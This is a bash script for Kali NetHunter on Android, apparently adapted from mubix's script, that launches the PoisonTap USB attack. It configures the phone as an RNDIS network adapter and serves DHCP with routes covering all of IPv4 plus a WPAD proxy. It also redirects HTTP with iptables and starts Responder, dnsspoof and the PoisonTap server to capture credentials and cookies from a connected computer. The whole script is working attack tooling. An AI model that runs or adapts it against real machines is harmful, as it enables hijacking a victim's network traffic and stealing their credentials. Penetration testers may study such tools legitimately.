#!/bin/bash
#
# Script by @binkybear
# Modified script form mubix-lock script for RNDIS capture
# For use on Nethunter on Android devices
#
# TODO: 
# https://github.com/samyk/poisontap/issues/49
# WEBOSOCKET ISSUE?


RNDIS="rndis0" # Older devices use usb0!
POISON_TAP="/opt/poisontap" # Location of poisontap folder

# ================== #
# Check for root
# ================== #
if [[ $EUID -ne 0 ]]; then
   echo "Please run this as root"
   exit
fi

# ================== #
# Let's save to root
# ================== #
cd /root

# ================== #
# Dependency checks
# ================== #
dep_check(){
DEPS=(git screen sqlite3 responder nodejs npm)
for i in "${DEPS[@]}"
do
  PKG_OK=$(dpkg-query -W --showformat='${Status}\n' ${i}|grep "install ok installed")
  echo "[+] Checking for installed dependency: ${i}"
  if [ "" == "$PKG_OK" ]; then
    echo "[-] Missing dependency: ${i}"
    echo "[+] Attempting to install...."
    sudo apt-get -y install ${i}
    [ $(node -p "require('ws/package.json').version") != "1.1.1" ] && npm install ws@1.1.1
  fi
done
}

# ================== #
# Run dependency check
# ================== #
dep_check

# ================== #
# Android: RNDIS setup
# ================== #
#
# TODO: Add check for RNDIS interface
#

echo "[+] Bringing down USB"

# We have to disable the usb interface before reconfiguring it
echo 0 > /sys/devices/virtual/android_usb/android0/enable
echo rndis > /sys/devices/virtual/android_usb/android0/functions
echo 224 > /sys/devices/virtual/android_usb/android0/bDeviceClass
echo 6863 > /sys/devices/virtual/android_usb/android0/idProduct
echo 1 > /sys/devices/virtual/android_usb/android0/enable

echo "[+] Check for changes"
# Check whether it has applied the changes
cat /sys/devices/virtual/android_usb/android0/functions
cat /sys/devices/virtual/android_usb/android0/enable

while ! ifconfig $RNDIS > /dev/null 2>&1;do
    echo "Waiting for interface $RNDIS"
    sleep 1
done

echo "[+] Setting IP for $RNDIS"
ip addr flush dev $RNDIS
ip addr add 1.0.0.1/24 dev $RNDIS
ip link set $RNDIS up

# ================== #
# Being DHCPD setup  #
# ================== #
echo "[+] Creating /root/poisontap-dhcpd.conf"
cat << EOF > /root/poisontap-dhcpd.conf
# notes below
ddns-update-style none;
default-lease-time 600;
max-lease-time 7200;
authoritative;
log-facility local7;

# wpad
option local-proxy-config code 252 = text;

# describe the codes used for injecting static routes
option classless-routes code 121 = array of unsigned integer 8;
option classless-routes-win code 249 = array of unsigned integer 8;

# A netmask of 128 will work across all platforms
# A way to cover /0 is to use a short lease.
# As soon as the lease expires and client sends a
# new DHCPREQUEST, you can DHCPOFFER the other half.
subnet 0.0.0.0 netmask 128.0.0.0 {
  range 1.0.0.10 1.0.0.50;
  option broadcast-address 255.255.255.255;
  option routers 1.0.0.1;
  default-lease-time 600;
  max-lease-time 7200;
  option domain-name "local";
  option domain-name-servers 1.0.0.1;
# send the routes for both the top and bottom of the IPv4 address space 
  option classless-routes 1,0, 1,0,0,1,  1,128, 1,0,0,1;
  option classless-routes-win 1,0, 1,0,0,1,  1,128, 1,0,0,1;
  option local-proxy-config "http://1.0.0.1/wpad.dat";
}
EOF

echo "[+] Remove previous dhcpd leases"
rm -f /var/lib/dhcp/dhcpd.leases
touch /var/lib/dhcp/dhcpd.leases

echo "[+] Creating SCREEN logger"
cat << EOF > /root/.screenrc
# Logging
deflog on
logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log
EOF
mkdir -p /root/logs

# ================== #
# Let's do it live!
# ================== #

# Samy uses isc-dhcp-server...shouldn't make a difference
echo "[+] Starting DHCPD server in background..."
/usr/sbin/dhcpd -cf /root/poisontap-dhcpd.conf

echo "[+] Wifi must be disabled.  Please disable if you have not yet."

read -p "Press enter to continue..."

# Flush any previous IP Tables
iptables -F
iptables -F -t nat
iptables -F bw_INPUT
iptables -F bw_OUTPUT

# Setup redireciton
iptables -A INPUT -p tcp --dport 1337 --jump ACCEPT
iptables -t nat -A PREROUTING -i $RNDIS -p tcp --destination-port 80 -j REDIRECT --to-port 1337

echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[+] Starting Responder on screen..."
screen -dmS responder /usr/bin/responder -I $RNDIS -f -w -r -d -F

echo "[+] Starting Dnsspoof on screen..."
screen -dmS dnsspoof /usr/sbin/dnsspoof -i $RNDIS port 53

echo "[+] Starting Poisontap on screen..."
screen -dmS poisontap /usr/bin/nodejs $POISON_TAP/pi_poisontap.js 


echo "Open new terminal and type: screen -r poisontap"
read -p "Press enter to kill when done..."

# ================== #
# SHUT IT DOWN
# ================== #
echo "[!] Shutting Down!"
pkill dhcpd
pkill responder
pkill dnsspoof
pkill nodejs

# Flush IP Tables
iptables -F
iptables -F -t nat
iptables -F bw_INPUT
iptables -F bw_OUTPUT

# Remove any leases
rm -f /var/lib/dhcp/dhcpd.leases

# Down interface!
echo 0 > /sys/class/android_usb/android0/enable
echo mtp,adb > /sys/class/android_usb/android0/functions
echo 1 > /sys/class/android_usb/android0/enable
ip addr flush dev $RNDIS
ip link set $RNDIS down

echo "[+] Goodbye!"
